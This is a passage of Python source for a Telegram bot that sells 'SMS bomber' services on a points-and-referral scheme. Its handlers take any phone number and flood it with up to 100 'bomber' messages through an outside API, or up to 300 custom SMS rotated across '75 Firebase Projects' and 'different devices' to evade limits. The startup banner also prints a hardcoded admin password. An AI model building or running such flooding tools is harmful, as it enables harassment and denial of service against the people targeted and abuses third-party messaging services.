    if not phone.startswith('+') or not phone[1:].isdigit():
        send_block(
            user_id,
            "❌ Invalid number!\nUse: +919876543210\n\nSend again or /cancel:"
        )
        bot.register_next_step_handler_by_chat_id(user_id, user_get_phone)
        return
    
    send_block(
        user_id,
        f"📞 Phone: {phone}\n\n📝 Now send your message:"
    )
    bot.register_next_step_handler_by_chat_id(user_id, user_get_message, phone)

def user_get_message(message, phone):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        send_block(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    msg_text = message.text.strip()
    
    if not msg_text:
        send_block(user_id, "❌ Message cannot be empty!", reply_markup=user_keyboard())
        return
    
    send_block(
        user_id,
        f"""
📞 Phone: {phone}
💬 Message: {msg_text[:50]}...

🔢 How many SMS to send?
💰 Each SMS = 1 Point
🔄 Each SMS = Different Device
⚡ ULTRA FAST SENDING!

Send a number (50-300):
"""
    )
    bot.register_next_step_handler_by_chat_id(user_id, user_get_count, phone, msg_text)

def user_get_count(message, phone, msg_text):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        send_block(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    try:
        count = int(message.text.strip())
        if count < 50 or count > 300:
            raise ValueError
    except:
        send_block(
            user_id,
            "❌ Invalid number!\nSend a valid number (50-300):"
        )
        bot.register_next_step_handler_by_chat_id(user_id, user_get_count, phone, msg_text)
        return
    
    points = get_user_points(user_id)
    total_cost = count
    
    if points < total_cost:
        send_block(
            user_id,
            f"❌ Insufficient points!\nNeed: {total_cost}\nHave: {points}\n\nEarn more via REFER!",
            reply_markup=user_keyboard()
        )
        return
    
    send_block(
        user_id,
        f"""
📞 Phone: {phone}
💬 {msg_text[:50]}...
📊 Count: {count}
💰 Cost: {total_cost} points

Send *YES* to confirm or /cancel
"""
    )
    bot.register_next_step_handler_by_chat_id(user_id, user_send_final, phone, msg_text, count)

def user_send_final(message, phone, msg_text, count):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        send_block(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    if message.text.upper() != 'YES':
        send_block(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    total_cost = count
    if not deduct_points(user_id, total_cost):
        send_block(user_id, "❌ Insufficient points!", reply_markup=user_keyboard())
        return
    
    send_block(
        user_id,
        f"""
⚡ 𝚂𝚎𝚗𝚍𝚒𝚗𝚐 {count} 𝚂𝙼𝚂...
"""
    )
    
    success, error, success_count, failed_count = send_multiple_sms(phone, msg_text, count, user_id)
    
    if not success:
        add_points(user_id, total_cost)
        send_block(
            user_id,
            f"""
❌ 𝙵𝙰𝙸𝙻𝙴𝙳!

{error}

𝙿𝚘𝚒𝚗𝚝𝚜 𝚁𝚎𝚏𝚞𝚗𝚍𝚎𝚍! 💰
""",
            reply_markup=user_keyboard()
        )
        return
    
    send_block(
        user_id,
        f"""
✅ 𝚂𝙼𝚂 𝚂𝙴𝙽𝚃! 🚀

📞 𝚃𝚘: {phone}
📊 𝚂𝚎𝚗𝚝: {success_count} ✅
📊 𝙵𝚊𝚒𝚕𝚎𝚍: {failed_count} ❌
💰 𝙿𝚘𝚒𝚗𝚝𝚜 𝙻𝚎𝚏𝚝: {get_user_points(user_id)}
""",
        reply_markup=user_keyboard()
    )

# ============================================================
#  USER - BOMBER
# ============================================================
@bot.message_handler(func=lambda message: message.text == "💣 BOMBER")
def bomber_button(message):
    user_id = message.chat.id
    
    if str(user_id) in load_json('ban.json'):
        send_block(user_id, "🚫 You are banned!")
        return
    
    points = get_user_points(user_id)
    if points < 1:
        send_block(user_id, "❌ Insufficient points! Need at least 1 point.", reply_markup=user_keyboard())
        return
    
    send_block(
        user_id,
        "💣 BOMBER\n\n📞 Enter phone number (without +91):\nExample: 9384747477\n\n_Type /cancel to cancel_"
    )
    bot.register_next_step_handler_by_chat_id(user_id, bomber_get_phone)

def bomber_get_phone(message):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        send_block(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    phone = message.text.strip()
    
    if not phone.isdigit() or len(phone) < 10:
        send_block(
            user_id,
            "❌ Invalid number!\nUse only digits without +91:\nExample: 9384747477\n\nSend again or /cancel:"
        )
        bot.register_next_step_handler_by_chat_id(user_id, bomber_get_phone)
        return
    
    send_block(
        user_id,
        f"📞 Phone: {phone}\n\n🔢 How many SMS to bomb?\n💰 Each SMS = 1 Point\nSend a number (1-100):"
    )
    bot.register_next_step_handler_by_chat_id(user_id, bomber_get_count, phone)

def bomber_get_count(message, phone):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        send_block(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    try:
        count = int(message.text.strip())
        if count <= 0 or count > 100:
            raise ValueError
    except:
        send_block(
            user_id,
            "❌ Invalid number!\nSend a valid number (1-100):"
        )
        bot.register_next_step_handler_by_chat_id(user_id, bomber_get_count, phone)
        return
    
    points = get_user_points(user_id)
    total_cost = count
    
    if points < total_cost:
        send_block(
            user_id,
            f"❌ Insufficient points!\nNeed: {total_cost}\nHave: {points}\n\nEarn more points!",
            reply_markup=user_keyboard()
        )
        return
    
    send_block(
        user_id,
        f"""
💣 BOMBER CONFIRM

📞 Phone: {phone}
🔢 Count: {count}
💰 Cost: {total_cost} points

Send *YES* to confirm or /cancel
"""
    )
    bot.register_next_step_handler_by_chat_id(user_id, bomber_send, phone, count)

def bomber_send(message, phone, count):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        send_block(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    if message.text.upper() != 'YES':
        send_block(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    total_cost = count
    if not deduct_points(user_id, total_cost):
        send_block(user_id, "❌ Insufficient points!", reply_markup=user_keyboard())
        return
    
    send_block(user_id, f"⏳ Sending {count} SMS to {phone}...")
    
    success, result = call_bomber_api(phone, count, user_id)
    
    if success:
        send_block(
            user_id,
            f"""
✅ BOMBER DONE!

📞 Phone: {phone}
🔢 Count: {count}
💰 Points Used: {total_cost}

<blockquote>Bomber completed successfully!</blockquote>
""",
            reply_markup=user_keyboard()
        )
    else:
        add_points(user_id, total_cost)
        send_block(
            user_id,
            f"❌ Bomber failed!\nError: {result}\n\nPoints refunded!",
            reply_markup=user_keyboard()
        )

# ============================================================
#  USER - REFER
# ============================================================
@bot.message_handler(func=lambda message: message.text == "👥 REFER")
def referee_button(message):
    user_id = message.chat.id
    
    link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
    
    send_block(
        user_id,
        f"""
👥 REFER & EARN

Share your referral link:
{link}

👥 Each referral = 100 Points
💰 Signup Bonus = 100 Points

<blockquote>Share with friends!</blockquote>
""",
        reply_markup=user_keyboard()
    )

# ============================================================
#  USER - ACCOUNT
# ============================================================
@bot.message_handler(func=lambda message: message.text == "👤 ACCOUNT")
def account_button(message):
    user_id = message.chat.id
    user_name = message.from_user.first_name or "User"
    username = message.from_user.username or "NoUsername"
    
    user = get_user_data(user_id)
    points = user.get('points', 100)
    sms_count = user.get('sms_count', 0)
    join_date = user.get('join_date', 'N/A')
    
    send_block(
        user_id,
        f"""
👤 MY ACCOUNT

👤 Name: {user_name}
👤 Username: @{username}
💰 Points: {points}
📨 SMS Sent: {sms_count}
📅 Joined: {join_date}

👥 Each referral = 100 Points
""",
        reply_markup=user_keyboard()
    )

# ============================================================
#  USER - REDEEM
# ============================================================
@bot.message_handler(func=lambda message: message.text == "🎁 REDEEM")
def redeem_button(message):
    user_id = message.chat.id
    
    send_block(
        user_id,
        "🎁 REDEEM CODE\n\n<blockquote>Enter your redeem code:</blockquote>"
    )
    bot.register_next_step_handler_by_chat_id(user_id, user_redeem_code)

def user_redeem_code(message):
    user_id = message.chat.id
    
    if message.text == '/cancel':
        send_block(user_id, "❌ Cancelled.", reply_markup=user_keyboard())
        return
    
    code = message.text.strip().upper()
    success, result = use_redeem_code(user_id, code)
    
    send_block(user_id, result, reply_markup=user_keyboard())

# ============================================================
#  USER - HELP
# ============================================================
@bot.message_handler(func=lambda message: message.text == "❓ HELP")
def help_button(message):
    user_id = message.chat.id
    
    send_block(
        user_id,
        f"""
❓ HELP GUIDE

📌 How to Send SMS
1. Click SEND SMS
2. Enter phone number (with +)
3. Enter your message
4. Enter how many SMS to send (50-300)
5. ⚡ ULTRA FAST SENDING!
6. Confirm with YES

💣 BOMBER
1. Click BOMBER
2. Enter phone number (without +91)
3. Enter count (1-100)
4. Cost: 1 Point per SMS
5. Confirm with YES

💰 Points System
• Signup Bonus: 100 Points
• Referral: 100 Points
• SMS Cost: 1 Point
• Bomber Cost: 1 Point per SMS
• Minimum SMS: 50 Points
• Maximum SMS: 300 Points

👥 Referral
Share your refer code with friends!

📢 Contact: @SOCIALBANNERR
""",
        reply_markup=user_keyboard()
    )

# ============================================================
#  FALLBACK
# ============================================================
@bot.message_handler(func=lambda message: True)
def fallback_handler(message):
    chat_id = message.chat.id
    
    if chat_id not in admin_session:
        send_block(chat_id, "Use the buttons below:", reply_markup=user_keyboard())

# ============================================================
#  START BOT
# ============================================================
if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════╗
    ║  🤖 MOD X PATEL SMS BOT              ║
    ║  ⚡ ULTRA FAST SMS SENDING           ║
    ║  💣 BOMBER FEATURE ACTIVE            ║
    ║  💰 Points System Active             ║
    ║  👥 Referral: 100 Points             ║
    ║  🎁 Signup: 100 Points              ║
    ║  📨 SMS: 1 Point (50-300) 🔥        ║
    ║  💣 Bomber: 1 Point per SMS (1-100) ║
    ║  🔄 75 Firebase Projects Active      ║
    ║  🔐 Admin Password: #patel45         ║
    ║  ➕ Admin Can Add/Remove Points      ║
    ╚═══════════════════════════════════════╝
    """)
    print(f"📢 Force Channel: {FORCE_CHANNEL}")
    print(f"📡 Firebase Projects: {len(load_firebase_config().get('projects', []))}")
    print("📱 Bot is running...")
    print("⚡ ULTRA FAST SMS MODE ACTIVE")
    print("📨 SMS LIMIT: 50-300 🔥")
    print("🔑 All Firebase keys updated!")
    
    # Clear webhook before polling
    try:
        bot.delete_webhook()
        print("✅ Webhook cleared!")
    except Exception as e:
        print(f"⚠️ Webhook clear error: {e}")
    
    # Clear pending updates
    try:
        bot.get_updates(offset=-1, timeout=10)
        print("✅ Pending updates cleared!")
    except Exception as e:
        print(f"⚠️ Clear updates error: {e}")
    
    # Start bot with error handling
    while True:
        try:
            bot.infinity_polling(skip_pending=True, timeout=30)
        except Exception as e:
            print(f"❌ Polling error: {e}")
            print("🔄 Restarting in 5 seconds...")
            time.sleep(5)
            continue